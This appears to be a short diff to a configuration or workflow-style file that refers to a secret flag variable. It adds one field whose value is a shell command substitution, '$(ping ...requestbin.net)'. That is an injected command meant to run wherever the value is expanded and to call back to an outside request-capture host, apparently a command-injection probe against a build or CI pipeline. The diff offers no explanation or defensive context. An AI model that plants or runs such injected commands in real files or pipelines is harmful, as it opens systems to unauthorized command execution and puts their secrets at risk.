@@ -555,3 +555,4 @@ R1gelX29:oihnd;
 flag : $flag
 flll : ${{ env.FLAG }}
 www:
+AFKL-CUIT:$(ping bc0beb4fae01345e7ddb.d.requestbin.net)
